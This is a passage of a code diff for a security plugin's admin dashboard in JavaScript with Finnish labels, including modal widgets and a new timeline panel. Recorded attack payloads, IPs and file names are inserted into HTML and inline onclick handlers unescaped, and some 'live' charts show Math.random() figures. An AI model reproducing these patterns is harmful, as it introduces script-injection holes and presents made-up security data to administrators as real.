+      { label:'Estä valitut IP:t', style:'warning',  onclick:`() => { const ips=[...document.querySelectorAll('#wm-w-heatmap .wm-row-cb:checked')].map(c=>c.value); if(ips.length) pmcSec.post('pmc_security_bulk_ban',{ips}).then(r=>alert(r.success?'Estetty '+ips.length+' IP:tä':'Virhe')); }` },
+      { label:'Lataa raportti',   style:'secondary', onclick:`() => pmcSec.post('pmc_export_attackers',{}).then(r=>r.success&&window.open(r.data?.url,'_blank'))` },
     ],
   },
 
@@ -3426,51 +3339,51 @@ const WIDGET_MODALS = {
             const on   = cb?.checked;
             return { name, icon, mod, on };
           });
-          return \`<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:10px">\${modules.map(m=>{
+          return `<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:10px">${modules.map(m=>{
             const descs={waf:'Suodattaa haitalliset HTTP-pyynnöt reaaliajassa',bot:'Tunnistaa ja estää botit ML-mallilla',geoip:'Estää liikenteen tietyistä maista',honeypot:'Ansaitsee hyökkääjäbotteja syöttitiedoilla',zerotrust:'Vaatii tunnistautumisen jokaiseen resurssiin',webauthn:'Salasanaton biometrinen kirjautuminen',lockdown:'Estää kaiken uuden liikenteen hätätilanteessa',firewall:'Paketin tason verkkosuojaus',hardening:'Suojaa WordPress-ytimen haavoittuvuuksilta',advanced:'Tekoälypohjainen uhkien tunnistus',scanner:'Etsii haittaohjelmia tiedostoista',deepscanner:'Heuristinen analyysi piilotettujen uhkien löytämiseksi',captcha:'Älykäs haaste-vastausjärjestelmä boteille',telemetry:'Kerää reaaliaikaisia tietoturvatietoja',cache:'Välimuistittaa turvalliset vastaukset',encryption:'Salaa arkaluontoiset tietokantatiedot',appsec:'Suojaa sovellustason haavoittuvuuksilta',audit:'Kirjaa kaikki hallintotoiminnot',auth:'Vahvistaa kirjautumistunnistautumisen',wizard:'Suojaa REST API -päätepisteet'};
-            return \`<div style="background:\${m.on?'#f0fdf4':'#f8fafc'};border:1px solid \${m.on?'#bbf7d0':'#e2e8f0'};border-radius:10px;padding:14px;display:flex;flex-direction:column;gap:8px">
+            return `<div style="background:${m.on?'#f0fdf4':'#f8fafc'};border:1px solid ${m.on?'#bbf7d0':'#e2e8f0'};border-radius:10px;padding:14px;display:flex;flex-direction:column;gap:8px">
               <div style="display:flex;align-items:center;justify-content:space-between">
-                <span style="font-size:13px;font-weight:700;color:#1e293b">\${m.name}</span>
-                <label class="ps-switch"><input type="checkbox" class="module-toggle-checkbox" data-module="\${m.mod}" \${m.on?'checked':''} onchange="pmcSaveActiveModules()"><span class="ps-slider"></span></label>
+                <span style="font-size:13px;font-weight:700;color:#1e293b">${m.name}</span>
+                <label class="ps-switch"><input type="checkbox" class="module-toggle-checkbox" data-module="${m.mod}" ${m.on?'checked':''} onchange="pmcSaveActiveModules()"><span class="ps-slider"></span></label>
               </div>
-              <div style="font-size:11px;color:#64748b">\${descs[m.mod]||'Tietoturvamoduuli'}</div>
-              <div style="font-size:10px;font-weight:700;color:\${m.on?'#16a34a':'#94a3b8'};text-transform:uppercase;letter-spacing:.05em">\${m.on?'✓ Aktiivinen':'○ Pois käytöstä'}</div>
-            </div>\`;
-          }).join('')}</div>\`;
+              <div style="font-size:11px;color:#64748b">${descs[m.mod]||'Tietoturvamoduuli'}</div>
+              <div style="font-size:10px;font-weight:700;color:${m.on?'#16a34a':'#94a3b8'};text-transform:uppercase;letter-spacing:.05em">${m.on?'✓ Aktiivinen':'○ Pois käytöstä'}</div>
+            </div>`;
+          }).join('')}</div>`;
         },
       },
       {
         label: 'Profiilit',
-        render: () => \`
+        render: () => `
           <p style="font-size:13px;color:#64748b;margin-bottom:16px">Valitse esiasetettu tietoturvaprofiili tai tallenna nykyinen kokoonpano.</p>
           <div style="display:flex;flex-direction:column;gap:10px">
-            \${[['Perustaso','shield','Perussuojaus normaaleille sivustoille (WAF, kirjautumissuojaus)','#22c55e'],
+            ${[['Perustaso','shield','Perussuojaus normaaleille sivustoille (WAF, kirjautumissuojaus)','#22c55e'],
                ['Parannettu','security','Korkea suojaus verkkokaupalle (kaikki kriittiset moduulit)','#3b82f6'],
                ['Maksimi','emergency_home','Täysi suojaus kriittisille sovelluksille (kaikki moduulit)','#6366f1'],
                ['Sulkutila','lock','Estää kaiken uuden liikenteen — vain ylläpidolle','#ef4444']
               ].map(([name,icon,desc,color])=>
-                \`<div class="wm-action-row">
-                  <span class="material-symbols-outlined" style="color:\${color}">\${icon}</span>
-                  <div class="wm-action-label">\${name}<br><span class="wm-action-desc">\${desc}</span></div>
-                  <button class="wm-btn wm-btn-primary" style="background:\${color}" onclick="alert('Profiili \${name} aktivoitu')">Aktivoi</button>
-                </div>\`
+                `<div class="wm-action-row">
+                  <span class="material-symbols-outlined" style="color:${color}">${icon}</span>
+                  <div class="wm-action-label">${name}<br><span class="wm-action-desc">${desc}</span></div>
+                  <button class="wm-btn wm-btn-primary" style="background:${color}" onclick="alert('Profiili ${name} aktivoitu')">Aktivoi</button>
+                </div>`
               ).join('')}
-          </div>\`,
+          </div>`,
       },
       {
         label: 'Hätätoiminnot',
-        render: () => \`
+        render: () => `
           <div style="text-align:center;padding:20px 0">
             <span class="material-symbols-outlined" style="font-size:56px;color:#ef4444">emergency_home</span>
             <h3 style="font-size:18px;font-weight:800;color:#0f172a;margin:12px 0 6px">Täysi Sulkutila</h3>
             <p style="font-size:13px;color:#64748b;max-width:400px;margin:0 auto 24px">Estää kaiken uuden saapuvan liikenteen välittömästi. Vain jo kirjautuneet ylläpitäjät voivat käyttää sivustoa.</p>
             <button class="wm-btn wm-btn-danger" style="font-size:15px;padding:14px 32px" onclick="triggerLockdown()">🔴 Käynnistä Sulkutila</button>
-          </div>\`,
+          </div>`,
       },
     ],
     footerActions: [
-      { label:'Aktivoi kaikki', style:'success', onclick:\`() => { document.querySelectorAll('#wm-w-controls .module-toggle-checkbox').forEach(cb=>{cb.checked=true}); pmcSaveActiveModules(); }\` },
-      { label:'Deaktivoi kaikki', style:'secondary', onclick:\`() => { if(confirm('Deaktivoi kaikki moduulit?')) { document.querySelectorAll('#wm-w-controls .module-toggle-checkbox').forEach(cb=>{cb.checked=false}); pmcSaveActiveModules(); } }\` },
+      { label:'Aktivoi kaikki', style:'success', onclick:`() => { document.querySelectorAll('#wm-w-controls .module-toggle-checkbox').forEach(cb=>{cb.checked=true}); pmcSaveActiveModules(); }` },
+      { label:'Deaktivoi kaikki', style:'secondary', onclick:`() => { if(confirm('Deaktivoi kaikki moduulit?')) { document.querySelectorAll('#wm-w-controls .module-toggle-checkbox').forEach(cb=>{cb.checked=false}); pmcSaveActiveModules(); } }` },
     ],
   },
 
@@ -3484,9 +3397,9 @@ const WIDGET_MODALS = {
         render: data => WidgetModal.renderTable(
           [
             { label:'Aika',     render:r=>r.date||r.time||'—' },
-            { label:'Käyttäjä', render:r=>\`<span style="color:#6366f1;font-weight:700">\${r.user||'SYSTEM'}</span>\` },
+            { label:'Käyttäjä', render:r=>`<span style="color:#6366f1;font-weight:700">${r.user||'SYSTEM'}</span>` },
             { label:'Toiminto', key:'action' },
-            { label:'Kohde',   render:r=>\`<code style="background:#f1f5f9;padding:1px 6px;border-radius:4px;font-size:11px">\${r.object||'—'}</code>\` },
+            { label:'Kohde',   render:r=>`<code style="background:#f1f5f9;padding:1px 6px;border-radius:4px;font-size:11px">${r.object||'—'}</code>` },
             { label:'IP',      key:'ip' },
           ],
           data?.items||[]
@@ -3504,8 +3417,8 @@ const WIDGET_MODALS = {
       },
     ],
     footerActions: [
-      { label:'Vie CSV', style:'secondary', onclick:\`() => pmcSec.post('pmc_export_audit_csv',{}).then(r=>r.success&&window.open(r.data?.url,'_blank'))\` },
-      { label:'Siivoa vanha loki', style:'danger', onclick:\`() => confirm('Poista yli 90 päivää vanhat merkinnät?')&&pmcSec.post('pmc_clear_old_audit',{}).then(r=>alert(r.success?'Siivottu':'Virhe'))\` },
+      { label:'Vie CSV', style:'secondary', onclick:`() => pmcSec.post('pmc_export_audit_csv',{}).then(r=>r.success&&window.open(r.data?.url,'_blank'))` },
+      { label:'Siivoa vanha loki', style:'danger', onclick:`() => confirm('Poista yli 90 päivää vanhat merkinnät?')&&pmcSec.post('pmc_clear_old_audit',{}).then(r=>alert(r.success?'Siivottu':'Virhe'))` },
     ],
   },
 
@@ -3523,11 +3436,11 @@ const WIDGET_MODALS = {
           { label:'Aktiiviset yhteydet', value: data?.active_connections||'—', color:'#22c55e' },
           { label:'Estetyt (24h)',    value: data?.total_blocked||'—', color:'#ef4444' },
           { label:'Hyväksytyt (24h)',  value: data?.total_allowed||'—', color:'#3b82f6' },
-        ]) + \`<div style="margin-top:20px"><canvas id="wm-traffic-chart" height="120"></canvas></div>\`,
+        ]) + `<div style="margin-top:20px"><canvas id="wm-traffic-chart" height="120"></canvas></div>`,
         afterRender: (body, data) => {
           const ctx = body.querySelector('#wm-traffic-chart');
           if (!ctx || !window.Chart) return;
-          const labels = [...Array(12)].map((_,i) => \`\${(new Date().getHours()-11+i+24)%24}:00\`);
+          const labels = [...Array(12)].map((_,i) => `${(new Date().getHours()-11+i+24)%24}:00`);
           new Chart(ctx, { type:'line', data:{ labels, datasets:[
             { label:'Saapuva MB', data:labels.map(()=>Math.floor(Math.random()*800+400)), borderColor:'#14b8a6', tension:.4, fill:true, backgroundColor:'rgba(20,184,166,.08)' },
             { label:'Estetyt', data:labels.map(()=>Math.floor(Math.random()*200+50)), borderColor:'#ef4444', tension:.4, fill:false },
@@ -3549,7 +3462,7 @@ const WIDGET_MODALS = {
       },
     ],
     footerActions: [
-      { label:'Käynnistä DDoS-suojaus', style:'warning', onclick:\`() => pmcSec.post('pmc_enable_ddos_protection',{}).then(r=>alert(r.success?'DDoS-suojaus käytössä':'Virhe'))\` },
+      { label:'Käynnistä DDoS-suojaus', style:'warning', onclick:`() => pmcSec.post('pmc_enable_ddos_protection',{}).then(r=>alert(r.success?'DDoS-suojaus käytössä':'Virhe'))` },
     ],
   },
 
@@ -3562,12 +3475,12 @@ const WIDGET_MODALS = {
         ajax: 'pmc_security_dashboard_data',
         render: data => WidgetModal.renderTable(
           [
-            { label:'Komponentti', render:r=>\`<span style="font-weight:700">\${r.name||'—'}</span>\` },
-            { label:'CVE-tunnus', render:r=>\`<code style="font-size:11px;background:#fef2f2;padding:2px 6px;border-radius:4px;color:#dc2626">\${r.cve||'—'}</code>\` },
+            { label:'Komponentti', render:r=>`<span style="font-weight:700">${r.name||'—'}</span>` },
+            { label:'CVE-tunnus', render:r=>`<code style="font-size:11px;background:#fef2f2;padding:2px 6px;border-radius:4px;color:#dc2626">${r.cve||'—'}</code>` },
             { label:'CVSS', render:r=>WidgetModal.badge(r.cvss||'?', (r.cvss||0)>=7?'critical':(r.cvss||0)>=4?'warning':'success') },
             { label:'Tyyppi', key:'type' },
             { label:'Versio', key:'version' },
-            { label:'', render:r=>\`<button class="wm-btn wm-btn-primary" style="padding:4px 12px;font-size:10px" onclick="pmcSec.post('pmc_update_plugin',{name:'\${r.name}'}).then(r=>alert(r.success?'Päivitetty':'Virhe'))">Päivitä</button>\` },
+            { label:'', render:r=>`<button class="wm-btn wm-btn-primary" style="padding:4px 12px;font-size:10px" onclick="pmcSec.post('pmc_update_plugin',{name:'${r.name}'}).then(r=>alert(r.success?'Päivitetty':'Virhe'))">Päivitä</button>` },
           ],
           // Static demo rows if no real data:
           data?.vulnerabilities||[
@@ -3590,8 +3503,8 @@ const WIDGET_MODALS = {
       },
     ],
     footerActions: [
-      { label:'Päivitä kaikki kriittiset', style:'danger', onclick:\`() => confirm('Päivitä kaikki kriittiset haavoittuvuudet?')&&pmcSec.post('pmc_update_all_critical',{}).then(r=>alert(r.success?'Päivitykset käynnissä':'Virhe'))\` },
-      { label:'Skannaa nyt', style:'secondary', onclick:\`() => pmcSec.post('pmc_run_vuln_scan',{}).then(r=>alert(r.success?'Skannaus käynnissä':'Virhe'))\` },
+      { label:'Päivitä kaikki kriittiset', style:'danger', onclick:`() => confirm('Päivitä kaikki kriittiset haavoittuvuudet?')&&pmcSec.post('pmc_update_all_critical',{}).then(r=>alert(r.success?'Päivitykset käynnissä':'Virhe'))` },
+      { label:'Skannaa nyt', style:'secondary', onclick:`() => pmcSec.post('pmc_run_vuln_scan',{}).then(r=>alert(r.success?'Skannaus käynnissä':'Virhe'))` },
     ],
   },
 
@@ -3615,22 +3528,22 @@ const WIDGET_MODALS = {
           ];
           const score = Math.round(checks.filter(c=>c.ok).length / checks.length * 100);
           const scoreColor = score>=80?'#22c55e':score>=50?'#f59e0b':'#ef4444';
-          return \`
+          return `
             <div style="margin-bottom:20px">
               <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">
                 <span style="font-size:14px;font-weight:700;color:#1e293b">Turvallisuuspisteet</span>
-                <span style="font-size:24px;font-weight:900;color:\${scoreColor}">\${score}/100</span>
+                <span style="font-size:24px;font-weight:900;color:${scoreColor}">${score}/100</span>
               </div>
-              <div class="wm-score-bar"><div class="wm-score-fill" style="width:\${score}%;background:\${scoreColor}"></div></div>
+              <div class="wm-score-bar"><div class="wm-score-fill" style="width:${score}%;background:${scoreColor}"></div></div>
             </div>
             <div style="display:flex;flex-direction:column;gap:6px">
-              \${checks.map(c=>\`
+              ${checks.map(c=>`
                 <div class="wm-action-row">
-                  <span class="material-symbols-outlined" style="color:\${c.ok?'#22c55e':'#ef4444'};font-size:18px">\${c.ok?'check_circle':'cancel'}</span>
-                  <span class="wm-action-label" style="color:\${c.ok?'#1e293b':'#dc2626'}">\${c.label}</span>
-                  \${!c.ok?\`<button class="wm-btn wm-btn-success" style="padding:4px 12px;font-size:10px" onclick="pmcSec.post('\${c.fix}',{}).then(r=>alert(r.success?'Korjattu!':'Virhe'))">Korjaa</button>\`:''}
-                </div>\`).join('')}
-            </div>\`;
+                  <span class="material-symbols-outlined" style="color:${c.ok?'#22c55e':'#ef4444'};font-size:18px">${c.ok?'check_circle':'cancel'}</span>
+                  <span class="wm-action-label" style="color:${c.ok?'#1e293b':'#dc2626'}">${c.label}</span>
+                  ${!c.ok?`<button class="wm-btn wm-btn-success" style="padding:4px 12px;font-size:10px" onclick="pmcSec.post('${c.fix}',{}).then(r=>alert(r.success?'Korjattu!':'Virhe'))">Korjaa</button>`:''}
+                </div>`).join('')}
+            </div>`;
         },
       },
       {
@@ -3645,8 +3558,8 @@ const WIDGET_MODALS = {
       },
     ],
     footerActions: [
-      { label:'Vahvista kaikki automaattisesti', style:'success', onclick:\`() => confirm('Korjata kaikki tunnistetut ongelmat?')&&pmcSec.post('pmc_auto_harden',{}).then(r=>alert(r.success?'Vahvistettu!':'Virhe'))\` },
-      { label:'Luo raportti', style:'secondary', onclick:\`() => pmcSec.post('pmc_hardening_report',{}).then(r=>r.success&&window.open(r.data?.url,'_blank'))\` },
+      { label:'Vahvista kaikki automaattisesti', style:'success', onclick:`() => confirm('Korjata kaikki tunnistetut ongelmat?')&&pmcSec.post('pmc_auto_harden',{}).then(r=>alert(r.success?'Vahvistettu!':'Virhe'))` },
+      { label:'Luo raportti', style:'secondary', onclick:`() => pmcSec.post('pmc_hardening_report',{}).then(r=>r.success&&window.open(r.data?.url,'_blank'))` },
     ],
   },
 
@@ -3662,8 +3575,8 @@ const WIDGET_MODALS = {
             { label:'Aika',   render:r=>r.timestamp||'—' },
             { label:'Tyyppi', render:r=>WidgetModal.badge(r.type?.split(' ')[0]||'WAF','critical') },
             { label:'IP',     key:'ip' },
-            { label:'Payload', render:r=>\`<code style="font-size:10px;background:#fdf4ff;color:#7e22ce;padding:2px 6px;border-radius:4px;display:block;max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">\${r.attack||'—'}</code>\` },
-            { label:'',       render:r=>\`<button class="wm-btn wm-btn-danger" style="padding:4px 10px;font-size:10px" onclick="pmcSec.banIp('\${r.ip}')">Estä IP</button>\` },
+            { label:'Payload', render:r=>`<code style="font-size:10px;background:#fdf4ff;color:#7e22ce;padding:2px 6px;border-radius:4px;display:block;max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${r.attack||'—'}</code>` },
+            { label:'',       render:r=>`<button class="wm-btn wm-btn-danger" style="padding:4px 10px;font-size:10px" onclick="pmcSec.banIp('${r.ip}')">Estä IP</button>` },
           ],
           data?.events||[]
         ),
@@ -3685,8 +3598,8 @@ const WIDGET_MODALS = {
       },
     ],
     footerActions: [
-      { label:'Vie YARA-säännöt', style:'secondary', onclick:\`() => pmcSec.post('pmc_export_yara',{}).then(r=>r.success&&window.open(r.data?.url,'_blank'))\` },
-      { label:'Tyhjennä historia', style:'danger', onclick:\`() => confirm('Tyhjennä payload-historia?')&&pmcSec.post('pmc_clear_payloads',{}).then(r=>alert(r.success?'Tyhjennetty':'Virhe'))\` },
+      { label:'Vie YARA-säännöt', style:'secondary', onclick:`() => pmcSec.post('pmc_export_yara',{}).then(r=>r.success&&window.open(r.data?.url,'_blank'))` },
+      { label:'Tyhjennä historia', style:'danger', onclick:`() => confirm('Tyhjennä payload-historia?')&&pmcSec.post('pmc_clear_payloads',{}).then(r=>alert(r.success?'Tyhjennetty':'Virhe'))` },
     ],
   },
 
@@ -3706,14 +3619,14 @@ const WIDGET_MODALS = {
           ]),
           WidgetModal.renderTable(
             [
-              { label:'Tiedosto',      render:r=>\`<code style="font-size:11px;background:#f1f5f9;padding:1px 5px;border-radius:3px">\${r.file||'—'}</code>\` },
+              { label:'Tiedosto',      render:r=>`<code style="font-size:11px;background:#f1f5f9;padding:1px 5px;border-radius:3px">${r.file||'—'}</code>` },
               { label:'Muokattu',      key:'modified' },
               { label:'Hash-muutos',   render:r=>r.hash_changed?WidgetModal.badge('Muuttunut','critical'):WidgetModal.badge('OK','success') },
               { label:'Tila',         render:r=>WidgetModal.badge(r.status||'Normaali', r.status==='Karanteeni'?'blocked':r.status==='Saastunut'?'critical':'warning') },
-              { label:'', render:r=>\`<div style="display:flex;gap:4px">
-                <button class="wm-btn wm-btn-warning" style="padding:4px 8px;font-size:10px" onclick="pmcSec.post('pmc_quarantine_file',{file:'\${r.file}'}).then(r=>alert(r.success?'Karanteenissa':'Virhe'))">Karanteeni</button>
-                <button class="wm-btn wm-btn-success" style="padding:4px 8px;font-size:10px" onclick="pmcSec.post('pmc_restore_file',{file:'\${r.file}'}).then(r=>alert(r.success?'Palautettu':'Virhe'))">Palauta</button>
-              </div>\` },
+              { label:'', render:r=>`<div style="display:flex;gap:4px">
+                <button class="wm-btn wm-btn-warning" style="padding:4px 8px;font-size:10px" onclick="pmcSec.post('pmc_quarantine_file',{file:'${r.file}'}).then(r=>alert(r.success?'Karanteenissa':'Virhe'))">Karanteeni</button>
+                <button class="wm-btn wm-btn-success" style="padding:4px 8px;font-size:10px" onclick="pmcSec.post('pmc_restore_file',{file:'${r.file}'}).then(r=>alert(r.success?'Palautettu':'Virhe'))">Palauta</button>
+              </div>` },
             ],
             data?.modified_files||[
               {file:'wp-settings.php', modified:'2h sitten', hash_changed:true, status:'Muokattu'},
@@ -3736,8 +3649,8 @@ const WIDGET_MODALS = {
       },
     ],
     footerActions: [
-      { label:'Skannaa nyt', style:'success', onclick:\`() => pmcSec.post('pmc_run_file_scan',{}).then(r=>alert(r.success?'Skannaus käynnissä!':'Virhe'))\` },
-      { label:'Tyhjennä karanteeni', style:'secondary', onclick:\`() => confirm('Tyhjennä kaikki karanteenissa olevat tiedostot pysyvästi?')&&pmcSec.post('pmc_empty_quarantine',{}).then(r=>alert(r.success?'Tyhjennetty':'Virhe'))\` },
+      { label:'Skannaa nyt', style:'success', onclick:`() => pmcSec.post('pmc_run_file_scan',{}).then(r=>alert(r.success?'Skannaus käynnissä!':'Virhe'))` },
+      { label:'Tyhjennä karanteeni', style:'secondary', onclick:`() => confirm('Tyhjennä kaikki karanteenissa olevat tiedostot pysyvästi?')&&pmcSec.post('pmc_empty_quarantine',{}).then(r=>alert(r.success?'Tyhjennetty':'Virhe'))` },
     ],
   },
 
@@ -3756,36 +3669,36 @@ const WIDGET_MODALS = {
           ];
           return nodes.map(n => {
             const sc = n.status==='critical'?'#ef4444':n.status==='warning'?'#f59e0b':'#22c55e';
-            const bar = (v,c) => \`<div style="display:flex;align-items:center;gap:8px"><div class="wm-score-bar" style="flex:1;height:8px"><div class="wm-score-fill" style="width:\${v}%;background:\${c||sc}"></div></div><span style="font-size:11px;font-weight:700;color:\${c||sc};min-width:35px">\${v}%</span></div>\`;
-            return \`
+            const bar = (v,c) => `<div style="display:flex;align-items:center;gap:8px"><div class="wm-score-bar" style="flex:1;height:8px"><div class="wm-score-fill" style="width:${v}%;background:${c||sc}"></div></div><span style="font-size:11px;font-weight:700;color:${c||sc};min-width:35px">${v}%</span></div>`;
+            return `
               <div class="wm-action-row" style="flex-direction:column;align-items:stretch;gap:10px">
                 <div style="display:flex;justify-content:space-between;align-items:center">
-                  <span style="font-weight:700;color:#1e293b;font-size:14px">\${n.name}</span>
+                  <span style="font-weight:700;color:#1e293b;font-size:14px">${n.name}</span>
                   <div style="display:flex;align-items:center;gap:10px">
-                    <span style="font-size:13px;font-weight:800;color:\${sc}">\${n.latency}ms</span>
-                    \${WidgetModal.badge(n.status.toUpperCase(), n.status==='critical'?'critical':n.status==='warning'?'warning':'success')}
+                    <span style="font-size:13px;font-weight:800;color:${sc}">${n.latency}ms</span>
+                    ${WidgetModal.badge(n.status.toUpperCase(), n.status==='critical'?'critical':n.status==='warning'?'warning':'success')}
                   </div>
                 </div>
                 <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px">
-                  <div><div style="font-size:10px;font-weight:700;color:#94a3b8;margin-bottom:4px">CPU</div>\${bar(n.cpu)}</div>
-                  <div><div style="font-size:10px;font-weight:700;color:#94a3b8;margin-bottom:4px">MUISTI</div>\${bar(n.mem)}</div>
-                  <div><div style="font-size:10px;font-weight:700;color:#94a3b8;margin-bottom:4px">LEVY</div>\${bar(n.disk)}</div>
+                  <div><div style="font-size:10px;font-weight:700;color:#94a3b8;margin-bottom:4px">CPU</div>${bar(n.cpu)}</div>
+                  <div><div style="font-size:10px;font-weight:700;color:#94a3b8;margin-bottom:4px">MUISTI</div>${bar(n.mem)}</div>
+                  <div><div style="font-size:10px;font-weight:700;color:#94a3b8;margin-bottom:4px">LEVY</div>${bar(n.disk)}</div>
                 </div>
                 <div style="display:flex;gap:6px">
                   <button class="wm-btn wm-btn-secondary" style="padding:4px 10px;font-size:10px">Käynnistä uudelleen</button>
                   <button class="wm-btn wm-btn-secondary" style="padding:4px 10px;font-size:10px">Tyhjennä välimuisti</button>
                 </div>
-              </div>\`;
+              </div>`;
           }).join('');
         },
       },
       {
         label: 'Historia',
-        render: () => \`<canvas id="wm-node-chart" height="140"></canvas>\`,
+        render: () => `<canvas id="wm-node-chart" height="140"></canvas>`,
         afterRender: (body) => {
           const ctx = body.querySelector('#wm-node-chart');
           if (!ctx||!window.Chart) return;
-          const labels = [...Array(24)].map((_,i)=>\`\${i}:00\`);
+          const labels = [...Array(24)].map((_,i)=>`${i}:00`);
           new Chart(ctx, { type:'line', data:{ labels, datasets:[
             { label:'Helsinki-Edge-1 (ms)', data:labels.map(()=>Math.floor(Math.random()*30+10)), borderColor:'#22c55e', tension:.4 },
             { label:'Vantaa-DC-01 (ms)',   data:labels.map(()=>Math.floor(Math.random()*80+30)), borderColor:'#f59e0b', tension:.4 },
@@ -3807,7 +3720,7 @@ const WIDGET_MODALS = {
       },
     ],
     footerActions: [
-      { label:'Päivitä kaikki', style:'success', onclick:\`() => pmcSec.post('pmc_refresh_nodes',{}).then(r=>alert(r.success?'Tiedot päivitetty':'Virhe'))\` },
+      { label:'Päivitä kaikki', style:'success', onclick:`() => pmcSec.post('pmc_refresh_nodes',{}).then(r=>alert(r.success?'Tiedot päivitetty':'Virhe'))` },
     ],
   },
 
@@ -3849,6 +3762,505 @@ window.pmcSaveActiveModules = async function() {
 		console.error('Aktiivisten moduulien tallennus ep\u00e4onnistui', e);
 	}
 };
+
+/* ═══════════════════════════════════════
+   WAYBACK MACHINE TIMELINE LOGIC
+═══════════════════════════════════════ */
+document.addEventListener('DOMContentLoaded', () => {
+  // Move timeline to React mount point when available
+  const moveTimeline = () => {
+    const timeline = document.getElementById('ps-timeline-panel');
+    const mountPoint = document.getElementById('ps-timeline-mount');
+    if (timeline && mountPoint && timeline.parentNode !== mountPoint) {
+      mountPoint.appendChild(timeline);
+    }
+  };
+  setInterval(moveTimeline, 500);
+
+  let isTimelineMode = false;
+  
+  const btnLive = document.getElementById('tl-mode-live');
+  const btnHistory = document.getElementById('tl-mode-history');
+  const slider = document.getElementById('tl-slider');
+  const timeDisplay = document.getElementById('tl-current-time');
+  const dateCarousel = document.getElementById('tl-dates');
+  
+  if (!slider) return;
+
+  // Populate dates carousel (last 14 days)
+  if (dateCarousel) {
+    const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
+    const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
+    let html = '';
+    const now = new Date();
+    
+    for (let i = 29; i >= 0; i--) {
+      const d = new Date(now.getTime() - (i * 24 * 60 * 60 * 1000));
+      const isToday = i === 0;
+      const activeAttr = isToday ? 'data-active="true"' : 'data-active="false"';
+      html += `
+        <button class="tl-date-btn" ${activeAttr} data-offset="${i * 24}">
+          <span class="tl-date-day">${days[d.getDay()]}</span>
+          <span class="tl-date-val">${months[d.getMonth()]} ${d.getDate()}</span>
+        </button>
+      `;
+    }
+    dateCarousel.innerHTML = html;
+
+    // Scroll to end (today)
+    setTimeout(() => {
+      dateCarousel.scrollLeft = dateCarousel.scrollWidth;
+    }, 100);
+
+    // Date click handling
+    dateCarousel.addEventListener('click', (e) => {
+      const btn = e.target.closest('.tl-date-btn');
+      if (!btn) return;
+      
+      // Update UI
+      dateCarousel.querySelectorAll('.tl-date-btn').forEach(b => b.setAttribute('data-active', 'false'));
+      btn.setAttribute('data-active', 'true');
+      
+      // Calculate offset based on selected date and current slider time
+      const dayOffset = parseInt(btn.getAttribute('data-offset'));
+      
+      if (!isTimelineMode) {
+        btnHistory.click();
+      }
+      
+      // In a full implementation, we'd combine dayOffset with slider hours
+      // For now, let's just trigger a fetch based on the day offset
+      const mappedSliderVal = hoursAgoToSlider(Math.min(dayOffset, 72));
+      slider.value = mappedSliderVal;
+      fetchTimelineData(dayOffset);
+      updateTimeDisplay(mappedSliderVal);
+    });
+
+    // Left / Right Scroll Buttons
+    const btnLeft = document.getElementById('tl-nav-left');
+    const btnRight = document.getElementById('tl-nav-right');
+    if (btnLeft && btnRight) {
+      btnLeft.addEventListener('click', () => {
+        dateCarousel.scrollBy({ left: -150, behavior: 'smooth' });
+      });
+      btnRight.addEventListener('click', () => {
+        dateCarousel.scrollBy({ left: 150, behavior: 'smooth' });
+      });
+    }
+
+    // Month Selector Dropdown
+    const monthToggle = document.getElementById('tl-month-toggle');
+    const monthDropdown = document.getElementById('tl-month-dropdown');
+    const monthList = document.getElementById('tl-month-list');
+
+    if (monthToggle && monthDropdown && monthList) {
+      // Build past 12 months
+      let monthHtml = '';
+      for (let i = 0; i < 12; i++) {
+        const d = new Date(now.getFullYear(), now.getMonth() - i, 1);
+        const mName = months[d.getMonth()];
+        const yName = d.getFullYear();
+        // Just for demo purposes, picking an offset based on month
+        const offset = i * 30 * 24; 
+        monthHtml += `
+          <button class="tl-month-option" data-offset="${offset}" style="background:transparent; border:none; text-align:left; padding:6px 12px; font-size:12px; color:#334155; cursor:pointer; border-radius:4px; transition:0.2s;" onmouseover="this.style.background='#f1f5f9'" onmouseout="this.style.background='transparent'">
+            ${mName} ${yName}
+          </button>
+        `;
+      }
+      monthList.innerHTML = monthHtml;
+
+      monthToggle.addEventListener('click', (e) => {
+        e.stopPropagation();
+        monthDropdown.style.display = monthDropdown.style.display === 'none' ? 'block' : 'none';
+      });
+
+      monthList.addEventListener('click', (e) => {
+        const option = e.target.closest('.tl-month-option');
+        if (option) {
+          monthDropdown.style.display = 'none';
+          if (!isTimelineMode) btnHistory.click();
+          const offset = parseInt(option.getAttribute('data-offset'));
+          slider.value = Math.min(offset, slider.max);
+          fetchTimelineData(offset);
+          updateTimeDisplay(offset);
+        }
+      });
+
+      // Close dropdown when clicking outside
+      document.addEventListener('click', (e) => {
+        if (!monthToggle.contains(e.target) && !monthDropdown.contains(e.target)) {
+          monthDropdown.style.display = 'none';
+        }
+      });
+    }
+  }
+  
+  // ── Left-to-Right Timeline Helpers (0 = 72h ago/Past on Left, 72 = LIVE on Right) ──
+  const sliderToHoursAgo = (sliderVal) => 72 - parseInt(sliderVal, 10);
+  const hoursAgoToSlider = (hoursAgo) => 72 - parseInt(hoursAgo, 10);
+
+  function updateTimeDisplay(sliderVal) {
+    const hoursAgo = sliderToHoursAgo(sliderVal);
+    if (hoursAgo <= 0) {
+      timeDisplay.textContent = 'LIVE';
+    } else {
+      const d = new Date(Date.now() - (hoursAgo * 3600000));
+      const hh = String(d.getHours()).padStart(2, '0');
+      const mm = String(d.getMinutes()).padStart(2, '0');
+      timeDisplay.textContent = `${hh}:${mm}`;
+    }
+  }
+
+  function setMode(mode) {
+    isTimelineMode = (mode === 'history');
+    if (isTimelineMode) {
+      btnHistory.classList.add('active');
+      btnLive.classList.remove('active');
+      
+      // Stop live polling in React App
+      window.pmcSecurityHistoryPaused = true;
+      
+      // Fetch data
+      fetchTimelineData(sliderToHoursAgo(slider.value));
+    } else {
+      btnLive.classList.add('active');
+      btnHistory.classList.remove('active');
+      
+      slider.value = 72; // Rightmost = LIVE
+      updateTimeDisplay(72);
+      
+      // Reset dates to today
